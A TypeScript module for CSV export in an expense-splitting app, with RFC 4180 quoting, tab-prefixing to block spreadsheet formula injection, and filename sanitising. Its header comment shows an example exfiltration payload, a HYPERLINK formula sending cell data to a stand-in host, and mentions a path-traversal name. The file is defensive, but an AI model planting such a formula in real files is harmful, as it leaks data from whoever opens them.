/**
 * CSV serialisation.
 * =============================================================================
 * Pure and dependency-free, so it can be tested without a database and reasoned
 * about on its own. Two hazards, and both are easy to get wrong quietly.
 *
 * QUOTING (correctness)
 * A field containing a comma, a quote or a newline has to be quoted, and a quote
 * inside a quoted field is escaped by doubling it (RFC 4180). Skipping this
 * silently shifts every later column on that row — an export that opens fine and
 * is subtly wrong, which is worse than one that fails.
 *
 * FORMULA INJECTION (security)
 * Excel, LibreOffice and Sheets evaluate any cell whose text begins with `=`,
 * `+`, `-` or `@` as a formula. A hostile flatmate who names an expense
 * `=HYPERLINK("http://evil.example/?d="&A1,"Rent")` has written code that runs on
 * the machine of whoever opens the export — reading other cells and exfiltrating
 * them through a click. This is not theoretical; it is CWE-1236, and it is the
 * standard way an "export" feature becomes a delivery mechanism.
 *
 * The fix is to prefix such fields with a tab, which suppresses evaluation while
 * displaying the original text. Escaping the leading character instead would
 * change what the user sees, and stripping it would corrupt legitimate values
 * like the note "-5 for the deposit".
 */

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Renders one value as a CSV field: injection-neutralised, then quoted if it
 * needs to be. The order matters — the tab is added before quoting so that it
 * ends up inside the quotes rather than stranded outside them.
 */
export function escapeCsvField(value: unknown): string {
  if (value === null || value === undefined) return "";

  let text = String(value);

  if (FORMULA_PREFIXES.some((prefix) => text.startsWith(prefix))) {
    text = `\t${text}`;
  }

  if (/[",\n\r\t]/.test(text)) {
    return `"${text.replaceAll('"', '""')}"`;
  }

  return text;
}

/**
 * Joins rows into a CSV document.
 *
 * CRLF line endings, per RFC 4180. Excel on Windows is the single most common
 * destination for a file like this and it treats a bare LF as part of the field
 * on some locales, which merges rows together.
 */
export function toCsv(rows: readonly (readonly unknown[])[]): string {
  return rows.map((row) => row.map(escapeCsvField).join(",")).join("\r\n");
}

/**
 * A filename that survives Content-Disposition and every filesystem.
 *
 * Quotes and semicolons in the header would end the filename early, and a
 * household called `../../etc` must not be able to steer where a browser writes.
 */
export function csvFilename(householdName: string, from: string, to: string): string {
  const safe = householdName
    .replace(/[^a-z0-9]+/gi, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, 40)
    .toLowerCase();

  return `${safe || "splitmate"}-${from}-to-${to}.csv`;
}
